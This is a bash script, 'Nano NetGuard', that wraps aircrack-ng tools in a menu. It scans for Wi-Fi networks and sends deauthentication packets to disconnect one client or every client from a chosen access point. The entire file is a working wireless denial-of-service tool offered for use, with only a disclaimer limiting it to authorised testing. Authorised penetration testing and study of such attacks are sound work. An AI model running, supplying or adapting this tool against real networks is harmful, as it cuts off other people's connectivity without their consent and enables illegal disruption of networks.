#!/bin/bash

# Nano NetGuard
# Created by Hafiz Muhammad Attaullah (@attaullah.com.pk)

show_menu() {
    echo "------------------------------------"
    echo "Nano NetGuard - Wi-Fi Deauthentication Tool"
    echo "1. Scan for Wi-Fi networks"
    echo "2. Select a Wi-Fi network for further actions"
    echo "3. Deauthenticate a specific client"
    echo "4. Deauthenticate all clients"
    echo "5. Check Wi-Fi Adapter Status"
    echo "6. Change Wi-Fi Adapter Interface Name"
    echo "7. Exit"
    echo ""
    echo -n "Enter your choice: "
    read choice
}

scan_networks() {
    echo "Scanning for Wi-Fi networks..."
    airodump-ng $wifi_interface
}

select_network() {
    echo -n "Enter the BSSID of the Wi-Fi network: "
    read wifi_bssid
    echo -n "Enter the channel of the Wi-Fi network: "
    read channel
    echo "Monitoring the selected network..."
    airodump-ng --bssid $wifi_bssid --channel $channel $wifi_interface
}

deauth_specific_client() {
    echo -n "Enter the number of deauthentication packets to send: "
    read deauth_packets
    echo -n "Enter the BSSID of the Wi-Fi network: "
    read wifi_bssid
    echo -n "Enter the client MAC address to deauthenticate: "
    read client_mac
    echo "Sending $deauth_packets deauthentication packets to client $client_mac on network $wifi_bssid..."
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid -c $client_mac $wifi_interface
}

deauth_all_clients() {
    echo -n "Enter the number of deauthentication packets to send: "
    read deauth_packets
    echo -n "Enter the BSSID of the Wi-Fi network: "
    read wifi_bssid
    echo "Sending $deauth_packets deauthentication packets to all clients on network $wifi_bssid..."
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid $wifi_interface
}

check_adapter_status() {
    echo "Wi-Fi Adapter Status:"
    iwconfig $wifi_interface
}

change_interface_name() {
    echo -n "Enter the new Wi-Fi adapter interface name: "
    read new_interface
    wifi_interface=$new_interface
    echo "Wi-Fi adapter interface name changed to $wifi_interface."
}

echo "Nano NetGuard created by Hafiz Muhammad Attaullah (@attaullah.com.pk)"
echo ""

echo "Disclaimer"
echo "1. This tool is provided for educational purposes only. It should not be used for illegal activities."
echo "2. Only use it for legitimate penetration testing, security research, and network devices you own or have permission to test."
echo "3. By using this tool, you agree that you will not engage in any unauthorized or illegal activities with it."
echo "4. Misuse of this tool may violate laws and regulations and can lead to legal consequences."
echo "5. The author of this tool shall not be held responsible for any damages or liabilities caused by its use or misuse."
echo "6. Use this tool responsibly, with proper authorization, and in compliance with all applicable laws."

echo ""

read -p "Press any key to continue..."

wifi_interface="wlan0"

while true; do
    show_menu

    case $choice in
        1)
            scan_networks
            ;;
        2)
            select_network
            ;;
        3)
            deauth_specific_client
            ;;
        4)
            deauth_all_clients
            ;;
        5)
            check_adapter_status
            ;;
        6)
            change_interface_name
            ;;
        7)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac

    echo
done
